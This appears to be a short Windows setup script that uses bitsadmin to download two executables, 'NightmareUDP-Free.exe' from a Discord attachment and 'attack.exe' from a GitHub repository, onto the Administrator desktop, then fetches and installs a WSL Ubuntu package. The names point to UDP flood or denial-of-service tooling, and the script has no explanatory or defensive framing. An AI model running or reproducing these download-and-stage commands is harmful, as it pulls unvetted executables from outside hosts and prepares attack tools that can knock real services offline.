bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/863248318888280095/864110680831164446/NightmareUDP-Free.exe" "C:\Users\Administrator\Desktop\NightmareUDP-Free.exe"
bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://github.com/RPT001/Nightmare/raw/master/attack.exe" "C:\Users\Administrator\Desktop\attack.exe"
bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://aka.ms/wsl-ubuntu-1804" "C:\Ubuntu.appx"
Powershell Add-AppxPackage -Path C:\Ubuntu.appx
